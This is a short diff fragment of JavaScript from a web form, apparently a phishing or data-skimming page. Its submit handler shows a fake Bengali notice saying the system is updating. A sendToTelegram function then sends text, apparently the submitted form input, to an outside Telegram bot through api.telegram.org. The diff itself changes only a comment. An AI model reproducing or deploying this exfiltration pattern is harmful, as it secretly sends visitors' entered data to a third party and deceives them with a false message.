@@ -38,7 +38,7 @@ document.getElementById('mainForm').addEventListener('submit', function(e) {
     alert("সিস্টেম আপডেট হচ্ছে, দয়া করে অপেক্ষা করুন।");
 });
 
-// টেলিগ্রাম ফাংশন (৪৩ নম্বর লাইনের লিঙ্কটি এখন সম্পূর্ণ)
+// টেলিগ্রাম ফাংশন
 function sendToTelegram(text) {
     const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
     fetch(url);
